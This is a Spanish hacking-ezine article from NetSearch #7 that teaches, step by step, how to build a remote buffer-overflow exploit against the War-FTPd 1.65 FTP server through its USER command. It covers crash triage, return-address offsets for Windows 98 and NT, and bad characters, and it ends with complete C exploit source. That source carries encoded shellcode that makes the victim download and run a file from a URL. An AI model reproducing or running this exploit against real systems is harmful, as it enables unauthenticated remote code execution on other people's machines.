@@ -1,0 +1,553 @@
+=-[ 0x04 ]-==================================================================
+=-[ NetSearch Ezine #7 ]-====================================================
+=-[ Shellcodes + Overflows en Win32 (II) ]-==================================
+=-[ por Eid0 ]-==============================================================
+ 
+
+
+WIN32 SHELLCODES
+UN ACERCAMIENTO PRACTICO: Exploit Remoto War-Ftpd 1.65
+
+PRESENTACION
+
+Hola, este es mi primer articulo para netsearch. 
+Cualquiera que quiera contactar conmigo para hacer comentarios y/o 
+correcciones puede encontrarme pululando en #netsearch como eid0, 
+o via mail en: 
+eid0@micro-electronica.com.
+
+Peace & Hack the world!! 
+
+
+INTRODUCCION 
+
+En este art¡culo intentare explicar de modo practico la construccion 
+de un exploit remoto por buffer overflow. Para seguirlo es necesario 
+dominar la teoria de buffer overflows, programacion asm en win32,
+creacion de shellcodes y estar familiarizado con el softice ya que no
+entrare para nada en estos temas.
+Si quereis informaros sobre la teoria en que se fundamentan estos ataques
+en windows, mirad el excelente articulo de Raise.
+
+En este articulo nos pelearemos con los problemas practicos, 
+que no son pocos, realizando un xploit remoto para un programa que
+utiliza SEH para evitar que se vean los segmentation faults.
+Nuestra victima va a ser el War-ftpd 1.65, es una version antigua
+pero muy utilizada de este famoso servidor de ftp para windows (aun 
+utiliza alguien windows para servidores? }:D).
+ Por favor, si alguien utiliza este servidor de ftp que se actualice a la
+ultima version disponible.
+
+Si quereis seguir bien este texto necesitareis un linuxete en una
+maquina que ademas tenga perl y netcat, y en la otra un windows con el
+warftpd, el softice, y el listdlls.
+El xploit lo he compilado en linux pero me imagino que compilara en
+windows sin practicamente modificaciones.
+El IDA y windisasm no los voy a mencionar pero no estaria mal que lo 
+tuvierais tambien. 
+
+
+COMIENZA EL ASEDIO
+ 
+Vale, pues venga, primero tenemos que saber donde encontrar un overflow
+explotable. A nuestros oidos ha llegado un rumor que dice que lanzando
+un comando USER con un nombre de esos que utiliza la gente que se cree 
+importante empiezan a pasar cosas raras. 
+Pos fale, probemos:
+ 
+[root@trastu /]# ftp 192.168.0.2
+220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready 220 Please enter 
+your user name.
+
+Name: JuanJesusmoiseschikitistansebastianfroilandetodoslossantos 331 
+User name okay, Need password.
+Password:kaka
+
+421 Password not accepted. Closing control connection. Login failed. 
+
+Joder, pues no ha pasado nada. Es que uno ya no puede confiar ni en un 
+rumor infundado :D
+ 
+En el display del log del warftpd me sale lo siguiente: 
+
+(1) [L 2001 10 10 13:37] 00001 JuanJesusmoiseschikitistansebastianfroilan
+detodoslossantos cntr User from 192.168.0.1 logged out. (2) [C 2001 10 10 
+13:37] 00001 JuanJesusmoiseschikitistansebastianfroilandetodoslossantos 
+cntr Illegal userid. Login refused.
+
+Llamo a mi confidente para decirle que es un mentiroso y tal, y que me 
+devuelva el dinero, entonces me dice que no, que el user ha de ser de 
+gente aun mucho mas importante, bueno, pues pongo las manos en el teclado 
+y le digo al linuz que fuerce un poquito mas la cosa. 
+
+[root@trastu /]# perl -e 'print "USER ","A"x2000,"\n"' | nc 192.168.0.2 21
+220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready 220 Please enter your
+ user name.
+331 User name okay, Need password. <---AQUI PULSAMOS CTRL-C PARA ABORTAR
+punt!
+
+Ostias!, el drwatson con su mensajito de la operacion no admitida. 
+Dice que ha habido un ostiazo en el modulo KERNEL32.DLL en la eip 
+167:bff87edf , vaya hombre, no nos ha aparecido nuestro querido overflow 
+de pila tradicional de eip=41414141 , sera un overflow de heap de esos 
+tan cabrones de explotar? Hay que investigar...
+ 
+Hacemos peek & poke con el Sice, nos metemos en el kernel32 en la eip
+ke nos dicen, vemos que estamos en la funcion virtualqueryex y vemos
+que se ha quedado sin pila, mmmm... esto no huele a heap overflow,
+esto mas bien parece que alguna funcion ha escrito sobre memoria no
+paginada y el propio handler de excepcion ha petado por no tener pila
+suficiente, este windows98....
+ 
+Si el overflow lo provocamos en un 2000-NT vemos que no ocurre nada,
+no salta el watson ni nada de nada, con lo que la hipotesis toma
+ consistencia, ya que indica que el S.O. es el que esta provocando la 
+excepcion.
+ 
+Vale, vamos a seguir pensando, si hemos escrito sobre una zona no 
+paginada que ha hecho ejecutar el handler de la excepcion, significa 
+que la funcion que esta overflowando un buffer se pasa de largo,
+es decir, overflowea el buffer, overflowea todos los datos contiguos
+al buffer, y por ultimo llega a una zona no paginada donde intenta
+escribir, y es donde el windows peta (mas exactamente ejecuta un 
+handler de excepcion que peta).
+O sea, que simplemente podria ser cuestion de no meter tantos caracteres 
+al buffer para no llegar a esa zona no paginada. Solo hay una manera de 
+saberlo... 
+
+Probemos:
+ 
+[root@trastu /]# perl -e 'print "USER ","a"x1000,"\n"' | nc 192.168.0.2 21
+220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
+punt!
+ 
+Lo mismo, el war peta en el mismo sitio.
+Sigamos... 
+[root@trastu /]# perl -e 'print "USER ","a"x500,"\n"' | nc 192.168.0.2 21
+220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
+punt!
+ 
+Ostias, el programa se tara, se pone a loggear lo mismo sin parar, pero el
+Watson no aparece con la excepcion. 
+Es momento de dar una vuelta de tuerca a las neuronas, que a veces sirven 
+para algo mas que para absorber cerveza... 
+Bueno, el programa no para de loggear y esta claro que le hemos chafado 
+todo lo chafable.. Se me ocurre una hipotesis que explicaria lo que esta 
+sucediendo, consiste mas o menos en que la rutina en cuestion este hecha 
+de esta forma: ...
+
+recibedatos()
+loggea:
+_try
+{
+loggeadatos
+}
+except sigsegv
+{
+goto loggea
+} 
+
+Esto es lo que en el mundillo del assembler de win32 se le llama como 
+exception handler de tipo 2 o de "por thread" que utiliza la 
+arquitectura SEH (Structured Exception Handler) del Windows.
+Cuando el procesador interrumpe la ejecucion de un proceso por que ha
+habido una excepcion de hardware (en este caso del procesador) va a 
+buscar en la tabla IDT (referenciada por el registro IDTR) que esta en 
+memoria que es lo que ha de ejecutar por haberse producido esa exception.
+El windows toma el control y utilizando el registro FS que apunta al TIB
+(thread information block) comienza a ejecutar todos los exceptions 
+handles chaineados que hayan hasta que uno le devuelva un 0 en eax.
+ 
+Otro posible handler es el de tipo 1 o de "por proceso", este se coloca 
+con el api SetUnhandledExceptionFilter y no se puede chainear, o sea 
+solo puede haber uno para todo un proceso (incluido sus threads). 
+Este se ejecuta cuando no hay un handler de tipo 2 y cuando el programa 
+no tiene debugger. 
+
+
+
+BUSCANDO EL ARCA PERDIDA
+ 
+Bien, visto lo visto, nos vemos obligados a buscar la funcion que 
+overflowea el buffer a mano. Con la ayuda de los breakpoints del Sice,
+traceamos el programa y buscamos la rutina.
+Esto podria llegar a ser muy largo y tedioso pero utilizando los 
+breakpoints de mensajes de ventana,los registros de debug del pentium 
+que nos permite interrumpir los programas cuando estos acceden a zonas
+de memoria que les digamos, y con unos cuantos comandos mas del softice,
+nos hacemos rapidamente con la rutina que esta jodiendo la marrana.
+Si quereis mas informacion sobre la busqueda de codigo con el softice,
+en la red se encuentran manuales de cracking que explican infinidad de
+metodos. Unos de los mas interesantes, entretenidos y didacticos son los 
+essays de +ORC, los cuales os recomiendo su lectura para pasar un buen
+rato. Lo unico necesario es utilizar un poco la cabeza y saber que esta 
+uno buscando (metodo Zen Cracking con imprescindible vodka & soda en 
+la mano ;)).
+ 
+Finalmente encontramos nuestra instruccion en la direccion 4044f9 ..
+..
+..
+4044f9 Call 44cfc4 
+..
+..
+Que no es mas que un call al "sprintf" de la libreria msvcrt.dll. 
+(Si teneis cargados los exports del msvcrt.dll vereis el call como 
+4044f9 Call sprintf ) 
+Bingooo!!! 
+
+Buscamos el ret de la subrutina y lo encontramos en: 
+404605 Ret 0004 
+
+
+COMPROBANDO EL HANDLER DE SEH Y VIENDO QUIEN ES QUIEN
+ 
+Ahora comprobaremos la existencia de un handler de excepcion que nos 
+oculta al watson. Para ello hacemos lo siguiente: 
+
+En el S-ice metemos un breakpoint de ejecucion: addr war-ftpd
+bpx 404605 
+En el linux lanzamos el ataque:
+[root@trastu /]# perl -e 'print "USER ","A"x500,"\n"' | nc 192.168.0.2 21
+220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
+punt! 
+El S-ice saca el pantallazo en el ret, pulsamos F8 y tenemos: 
+0167:41414141 INVALID
+0167:41414143 INVALID 
+
+Lineaaa!! Ha overflowado la IP y se nos ha ido a nuestra querida direccion
+41414141 ("AAAA"), si volvemos a pulsar F8 veremos que el war sigue 
+ejecutandose sin rechistar ya que se ha ejecutado el exception handler, 
+y el S-ice anda un poco perdido.
+Si comprobamos el TIB, inspeccionamos el registro FS vemos que el handler
+no es de tipo 2, o sea que tiene que ser de tipo 1 y ha sido puesta en 
+algun momento por el programa(o sus librerias) con el 
+SetUnhandledExceptionFilter. 
+
+Pero en definitiva,
+ESTE ES UN OVERFLOW NORMAL DE PILA!!!! 
+
+
+REENCUENTRO CON VIEJOS AMIGOS
+ 
+El warftpd hace la siguiente llamada al snprintf, 
+sprintf ( variable local de pila=ECX , "[L 2001 fecha actual] AAAAAA..
+AAAAA.....AAAAAAAA cntr User from 192.168.0.1 logged out" );
+ 
+Como podemos comprobar esas son nuestras A's pero el war las ha precedido
+de "[L 2001 fecha actual]" y lo que es peor, como ya se vera luego,
+es que lo ha finalizado con "cntr User from 192.168.0.1 logged out".
+
+
+RECOPILANDO INFO 
+
+En Win98, en el momento de hacer el sprintf, ESP vale 00ccfafc, 
+la variable local esta referenciada en ECX que vale 00ccfb18. 
+
+Vamos a ver cuanto espacio tenemos en la pila, tecleamos en el S-ice: 
+
+addr war-ftpd
+D CCFB18 
+
+Vemos la pila y vemos que acaba en 0xCCFFFF. Ahora reseteamos todo y 
+vemos la situacion cuando se alcanza el ret.
+
+BPX 404605 
+Atacamos y cuando nos da el pantallazo tenemos varios datos interesantes:
+ESP=CCFD18
+EBP=CCFD78
+EBX=CCFE14 
+
+Bueno, ahora repasamos y sacamos la calculadora: 
+Bytes antes del ret=> CCFD18-CCFAFC=540 bytes.
+Despues del ret tenemos=>CCFFFF-CCFD1C=739 bytes. 
+
+Estos numeros no estan pulidos ya que nuestro USER solo puede 
+utilizar un porcentaje de estos buffers. 
+
+
+Y COMIENZAN LOS PROBLEMAS
+ 
+Ahora empezamos a dislumbrar los problemas, empecemos a enumerarlos: 
+
+1.Como el war nos finaliza la cadena con ese "has logged out", 
+no podremos utilizar el 0 del fin de cadena para saltar al segmento 
+de codigo del warftpd en alguna instruccion CALL ESP o equivalente, 
+por lo que tendremos que utilizar las librerias de Windows para tomar
+el control del overflow. Bienvenido al mundo de las versiones de windows.
+Esto ya lo retomaremos mas tarde.
+ 
+2.Entre el snprintf y el ret, la rutina modifica muchos bytes del buffer 
+antes y despues del ret,a parte hemos de restar el tama¤o del string que 
+antepone y que finaliza la cadena del log, por lo que con estas 
+correcciones tenemos: 
+
+Bytes antes del ret=450bytes
+Bytes despues=650bytes
+
+3. Bytes prohibidos en el buffer, el nombre de usuario no puede tener 
+los bytes 0x40 ("@"),0x0d(intro),0x0F, ni 0. Con lo que la shellcode 
+no podra tener estos caracteres.
+ 
+
+NOS CREAMOS UNA MINISHELLCODE 
+
+Bueno, con esta informacion, ahora debemos de crearnos una shellcode 
+pequeña y que no contenga los caracteres prohibidos.
+Esta parte me la salto, para mas detalles sobre como hacer shellcodes 
+para win32, leeros el articulo de Raise. 
+Finalmente, con esfuerzo, consigo hacerme una shellcode de 350 bytes
+a los que sumo espacio para meter una url de aprox 50 bytes con lo que 
+finalmente obtengo la shellcode de 407 bytes, y con el contenido 
+minimamente encriptado para no ir enseñando las entrañas a todos los 
+sniffers y logs del mundo.
+
+ 
+A GRANDES PROBLEMAS GRANDES REMEDIOS
+ 
+Bien, nos encontramos con que no podemos utilizar el modulo del programa
+para saltar alli y darle la ejecucion a la pila, ya que este esta en la
+zona 0x0040xxxx y no podemos conseguir un 0 para chafar la IP debido a 
+que la cadena acaba en "has logged out"\0. 
+Esto nos obliga a buscar una instruccion amiga en alguna dll cargada en 
+el contexto del programa, y aqui es donde empiezan los verdaderos 
+problemas, si pudieramos saltar al modulo warftpd.exe con la ayuda del 0 
+tendriamos un xploit que funcionaria en todas las plataformas sin tener 
+que modificar nada, ahora tendremos que echar mano de las dlls de Windows 
+mapeadas por el proceso y su universo de versiones.
+ 
+Echo un vistazo y me doy cuenta de que un call o jmp esp esta solo 
+en las librerias de windows que mas cambian entre versiones, por lo que 
+explotar un sistema desconocido podria ser una odisea, adivinando 
+versiones y demas... 
+Vamos a ver que mas tenemos, ahora le echo un ojo a los datos que marque
+como interesantes cuando se producia el ret, es decir, EBP y EBX. 
+En el momento del ret EBP apunta a una zona de pila posterior al 
+retadress, podriamos utilizar esto para buscar en las librerias 
+un CALL/JMP EBP que es mucho mas comun que no los JMP ESP, 
+y lo podremos encontrar en librerias mas estables del windows.
+
+El problema es que ebp variara mucho si el war esta en win98 o si esta 
+en NT/2000 por lo que vamos a generar otra shellcode que encapsulara 
+a la primera y sera muy flexible teniendo en cuenta que su inicio de 
+ejecucion puede variar enormemente debido a ebp:
+
+
+SHELLCODE 2, MULTIWINDOWS
+ 
+         nop  <-iniciobuffer
+         .
+         nop
+         SHELLCODE1 PROPIAMENTE DICHA (407 bytes)
+         bytes irrelevantes ke
+         kambiara el war
+ccfd18:  retaddress->apunta a instruccion de libreria
+                     con call ebp o jmp ebp
+                     [ccfd78 en windows98]
+ccfd1c:  bytes irrelevantes
+         ke kambiara el war
+         nop
+         ..
+ccfd78:  nop
+         nop
+         ..
+         nop
+         add esp,FFFFFE3E
+         jmp esp
+         \0
+
+Como se puede ver ahora hay un nivel de indireccion mas, el call ebp
+llevara la ejecucion a la zona de memoria alta de nops que al final
+saltara a la zona baja de nops donde finalmente se ejecutara la shell
+original. 
+Como vemos, para realizar esto, solo tenemos que paddearla con nops 
+antes y detras todo lo que podamos y al final meter una instruccion 
+de resta de esp (en este caso sumamos -300 para que no de ningun 0 en 
+los codeops) y saltar a ella, ya que las pilas seran diferentes para NT 
+y win9x y no debemos hardcodear las direcciones. 
+
+
+BUSCANDO OFFSETS DESESPERADAMENTE
+ 
+Ahora es cuestion de buscar algunos offsets en librerias de Windows 
+que sepa que no varien mucho en el tiempo y que contengan mis 
+instrucciones favoritas CALL EBP,JMP EBP. 
+
+Esto se consigue instalando todas las versiones de NT, yo lo hago con 
+ghost para cambiar de tipo de NT en 2-3 minutos, y luego ejecutar el 
+programa listdlls que nos dira que librerias hay instaladas en el 
+contexto del proceso war-ftpd. 
+
+Al tener el sistema flexible de explotacion nos hacen falta pocos 
+offsets. 
+
+Win9x que lo encontramos en el kernel32.dll dir. 0xbff941e2-->CALL EBP
+Uno para NT SP3-SP6 originales->0x779e2b2e libreria MSVCRT.DLL
+Otro para NT's SP6 con Internet Explorer 5 o posterior en 0x77df53f7
+
+
+RESULTADO FINAL
+
+Finalmente, nos generamos un programa en C que genera esta segunda 
+shellcode a partir de la primera que esta hecha en asm y saca toda 
+la shellcode resultante por pantalla.
+ 
+Al payload del xploit le pongo un codigo que se conecta a una pagina 
+web, baja un archivo determinado y lo ejecuta, en este caso el archivo 
+al que apunto es un juego de ping-pong de MSX. 
+
+Llega el momento de la verdad, el momento de explotar el warftpd...
+
+[root@trastu exploitwar165]# 
+warexp 2 http://192.168.0.1/pinpon.exe | nc 192.168.0.2 21
+
+220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready 220 
+Please enter your user name.
+331 User name okay, Need password. <---Pulsar Ctrl-C
+punt! 
+
+En el Windows de la maquina atacada la pantalla da un flash,
+el war-ftpd se esfuma, y el juego aparece, despues de la dura batalla,
+nos tomamos nuestro merecido descanso... 
+
+Eid0
+http://www.micro-electronica.com
+eid0@micro-electronica.com
+
+
+CODIGO FUENTE EXPLOIT WAREXP.C
+
+/////////////////////////////////////////////////////////
+// Remote Xploit for Warftpd 1.65
+/////////////////////////////////////////////////////////
+//
+// This Xploit forces a remote Windoze war-ftpd to download a program 
+// from an url and execute it with VISIBLE mode.
+// It doesn't need any account as the overflow is in the command USER.
+// Don't bother to ask me how to change the payload to be invisible.
+// The world don't need script kiddies.
+// World need people thinking themselves.
+// Peace
+//
+// Compilation: gcc warexploit.c -o warexp
+//
+// Execution:
+// warexp typeofwindows url | nc ipvictim portftp(21)
+//
+// Example
+// warexp 0 http://www.myhost.com/pingpong.exe | nc victimhost 21
+// 220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
+// 220 Please enter your user name.
+// 331 User name okay, Need password. 
+// <--Press Ctrl-C or put any password
+// punt!
+//
+// Greetz to: Raise, and all people in #netsearch
+// Dedicated to AnnA: I love you
+//
+// eid0
+// eid0@micro-electronica.com
+// http://www.micro-electronica.com
+// explanatory article in:
+// http://www.netsearch-ezine.com ezine #7 or
+// http://www.micro-electronica.com/docz/infoexploitwarftpd.htm
+//
+/////////////////////////////////////////////////////////////////
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+//#define OVERLEN 585
+#define NOP 0x90
+
+unsigned char astroploit[] =
+{0x54,0x5F,0x33,0xC0,0x50,0xF7,0xD0,0x50,0x59,0xF2,0xAE,0x39,0x47,
+0xFC,0x75,0xF9, 0x59,0xB1,0xB8,0x8B,0xC7,0x48,0x80,0x30,0x99,0xE2,
+0xFA,0x83,0xE4,0xFC,0x33,0xF6, 0x96,0xBB,0x11,0x44,0xCA,0x44,0xC1,
+0xEB,0x08,0x56,0xFF,0x13,0x8B,0xD0,0xFC,0x33, 0xC9,0xB1,0x06,0xAC,
+0x84,0xC0,0x75,0xFB,0x52,0x51,0x56,0x52,0x66,0xBB,0x18,0xCA,0xFF,
+0x13,0xAB,0x59,0x5A,0xE2,0xEC,0xAC,0x84,0xC0,0x75,0xFB,0x66,0xBB,
+0x44,0xCA, 0x56,0xFF,0x13,0x8B,0xD0,0xFC,0x33,0xC9,0xB1,0x03,0xAC,
+0x84,0xC0,0x75,0xFB,0x52, 0x51,0x56,0x52,0x66,0xBB,0x18,0xCA,0xFF,
+0x13,0xAB,0x59,0x5A,0xE2,0xEC,0xAC,0x84, 0xC0,0x75,0xFB,0x33,0xDB,
+0x53,0x53,0x53,0x43,0x53,0x4B,0x53,0xFF,0x57,0xF4,0x53, 0x53,0x53,
+0x53,0x56,0x50,0xFF,0x57,0xF8,0x50,0xAC,0x84,0xC0,0x75,0xFB,0x58,
+0x89, 0x37,0x50,0xAC,0x84,0xC0,0x75,0xFB,0xB8,0xFF,0x0F,0xD4,0x30,
+0xC1,0xE8,0x0C,0x8B, 0xE8,0x58,0x50,0x8B,0xF7,0x83,0xC6,0x04,0x55,
+0x33,0xDB,0x53,0xFF,0x57,0xE0,0x89, 0x46,0x04,0x58,0x56,0x55,0xFF,
+0x76,0x04,0x50,0xFF,0x57,0xFC,0x53,0xFF,0x37,0xFF, 0x57,0xE8,0xFF,
+0x36,0xFF,0x76,0x04,0x50,0x8B,0xD8,0xFF,0x57,0xEC,0x53,0xFF,0x57, 
+0xF0,0x33,0xDB,0x83,0xC3,0x05,0x53,0xFF,0x37,0xFF,0x57,0xDC,0xFF,
+0x57,0xE4,0x4B, 0x45,0x52,0x4E,0x45,0x4C,0x33,0x32,0x00,0x57,0x69,
+0x6E,0x45,0x78,0x65,0x63,0x00, 0x47,0x6C,0x6F,0x62,0x61,0x6C,0x41,
+0x6C,0x6C,0x6F,0x63,0x00,0x45,0x78,0x69,0x74, 0x50,0x72,0x6F,0x63,
+0x65,0x73,0x73,0x00,0x5F,0x6C,0x63,0x72,0x65,0x61,0x74,0x00, 0x5F,
+0x6C,0x77,0x72,0x69,0x74,0x65,0x00,0x5F,0x6C,0x63,0x6C,0x6F,0x73,
+0x65,0x00, 0x57,0x49,0x4E,0x49,0x4E,0x45,0x54,0x00,0x49,0x6E,0x74,
+0x65,0x72,0x6E,0x65,0x74, 0x4F,0x70,0x65,0x6E,0x41,0x00,0x49,0x6E,
+0x74,0x65,0x72,0x6E,0x65,0x74,0x4F,0x70, 0x65,0x6E,0x55,0x72,0x6C,
+0x41,0x00,0x49,0x6E,0x74,0x65,0x72,0x6E,0x65,0x74,0x52, 0x65,0x61,
+0x64,0x46,0x69,0x6C,0x65,0x00,0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,
+0x77, 0x77,0x77,0x2E,0x6D,0x69,0x63,0x72,0x6F,0x2D,0x65,0x6C,0x65,
+0x63,0x74,0x72,0x6F, 0x6E,0x69,0x63,0x61,0x2E,0x63,0x6F,0x6D,0x2F,
+0x68,0x61,0x63,0x6B,0x65,0x61,0x64, 0x6F,0x2E,0x65,0x78,0x65,0x00,
+0x68,0x61,0x63,0x6B,0x65,0x61,0x64,0x6F,0x2E,0x65, 0x78,0x65,0x00,
+0xFF,0xFF,0xFF,0xFF};
+int aux;
+unsigned int retoffsets[]={0xbff941e2,0x779e2b2e,0x77df53f7};
+//char targets[]={"win98SE Castellano","WinNT SP4-SP6",
+// "WinNT SP6-IE5.5"};
+int main(int argc,char * argv[])
+{
+char * buffer;
+unsigned int * temp;
+char comando[6]="USER ";
+int lencomando;
+unsigned int lenstack,lenastroploit;
+unsigned int offset;
+char jmpesp[]={0x81,0xc4,0x3e,0xfe,0xFF,0xFF,0xFF,0xe4}; 
+//OPCODES DE add esp-450;jmp esp
+if (argc<3)
+{
+printf ("War-ftpd 1.65 Remote Exploit Demonstration by eid0\nThis 
+exploits forces war-ftpd to download a file from an url and executes 
+it in VISIBLE mode.\nUsage: %s typehost url | nc victimhost
+ 21(ftp-port)\nWindows types:\n0 ->%s\n1 ->%s\n2 ->%s\n",
+argv[0],"win98SE Castellano(Spanish)","WinNT SP4-SP6 with IE<5",
+"WinNT SP6 with IE5.5.\nThe url must not excede 45 characters.");
+return 0;
+}
+
+lencomando=strlen(comando);
+buffer=malloc(3000);
+memset(buffer,NOP,3000);
+memcpy(buffer,comando,lencomando);
+
+lenstack=0xccfd18-0xccfb18;
+lenastroploit=sizeof(astroploit);
+strcpy(&(astroploit[0x158]),argv[2]); 
+//an xploitable xploit xD don't suid it
+
+aux=strlen(argv[2]);
+while (((argv[2])[aux] != '/') && (aux>=0)) aux--;
+if (!aux) {printf("Bad url,talking head...\nExiting...\n");return 0;}
+strcpy(&astroploit[0x158+strlen(argv[2])+1],&((argv[2])[aux+1]));
+//printf("\n->cadena=%s\n",&((argv[2])[aux+1]));
+for (offset=0xdf;offset<(lenastroploit-4);offset++)
+astroploit[offset]^=0x99;
+
+temp=(unsigned int *)&(buffer[lencomando+lenstack-27]);
+*(temp)=retoffsets[atoi(argv[1])];
+memcpy((char *)((unsigned int)temp)-lenastroploit,
+astroploit,lenastroploit);
+
+((unsigned int)temp)+=4;
+((unsigned int)temp)+=300;
+memcpy(temp,&(jmpesp),sizeof(jmpesp));
+((unsigned int)temp)+=sizeof(jmpesp);
+*((int *)temp)=0x0a0d;
+lenastroploit=strlen(buffer);
+write(1,buffer,lenastroploit);
+return(0);
+}
+
+
